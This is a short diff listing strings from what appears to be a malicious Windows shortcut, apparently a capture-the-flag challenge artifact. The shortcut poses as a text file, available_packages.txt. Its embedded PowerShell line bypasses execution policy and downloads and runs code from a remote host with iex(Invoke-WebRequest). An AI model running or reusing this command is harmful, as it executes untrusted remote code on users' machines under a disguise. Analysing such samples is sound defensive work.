@@ -1,0 +1,12 @@
+Windows
+ystem32
+WindowsPowerShell
+v1.0
+owershell.exe
+?..\..\..\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+C:\Users\john\Desktop
+-ExecutionPolicy Bypass "$C2='fileless.ecsc23.hack.cert.pl:5060;iex(Invoke-WebRequest \"http://$C2/ywHcw88t9ExkgtCj2lUO\" -UseBasicParsing).Content"
+available_packages.txt
+Text Document
+C:\Users\john\Desktop\available_packages.txt
+C:\Users\john\Desktop
